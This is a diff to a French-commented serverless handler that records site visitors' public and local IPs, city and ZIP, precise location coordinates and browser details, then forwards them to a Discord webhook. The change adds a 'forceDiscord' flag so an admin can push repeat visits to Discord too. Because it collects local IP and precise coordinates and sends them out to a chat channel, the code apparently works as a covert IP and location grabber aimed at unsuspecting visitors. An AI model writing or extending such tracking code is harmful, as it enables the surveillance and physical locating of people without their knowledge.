@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     console.error("Erreur géo:", e);
   }
 
-  const { sessionId, isUpdate, localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
+  const { sessionId, isUpdate, forceDiscord, localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
 
   let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
   
@@ -63,6 +63,7 @@ export default async function handler(req, res) {
   const logEntry = {
     sessionId: sessionId || 'unknown',
     isUpdate: !!isUpdate,
+    forceDiscord: !!forceDiscord,
     timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
     publicIp,
     localIp,
@@ -79,12 +80,15 @@ export default async function handler(req, res) {
 
   console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));
 
-  // Envoi vers Discord (UNIQUEMENT si ce n'est PAS une mise à jour périodique)
+  // Envoi vers Discord (Si première visite OU si forcé par l'admin)
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
-  // LOGIQUE DE BLOCAGE DE SPAM : 
-  // On n'envoie sur Discord QUE si c'est la TOUTE PREMIÈRE visite (isUpdate est faux ou absent)
-  const shouldSendToDiscord = webhookUrl && (isUpdate === false || isUpdate === undefined || isUpdate === "false");
+  const shouldSendToDiscord = webhookUrl && (
+    logEntry.forceDiscord === true || 
+    isUpdate === false || 
+    isUpdate === undefined || 
+    isUpdate === "false"
+  );
 
   if (shouldSendToDiscord) {
     const cleanCoords = logEntry.coords.replace(/\s/g, '');
